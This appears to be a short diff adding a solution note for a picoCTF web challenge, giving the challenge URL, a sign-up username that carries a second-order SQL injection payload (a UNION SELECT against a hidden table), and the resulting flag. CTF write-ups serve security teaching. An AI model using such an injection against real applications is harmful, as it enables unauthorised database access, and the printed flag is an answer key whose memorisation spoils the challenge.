@@ -1,0 +1,8 @@
+Access to http://crystal-peak.picoctf.net:59562/:
+
+Sign up with the following data:
+Username: a' UNION SELECT name,value,'2026-03-27' FROM aDNyM19uMF9mMTRn--
+Password: a
+
+Generate report and download the flag:
+picoCTF{s3c0nd_0rd3r_1t_1s_11b57aae}
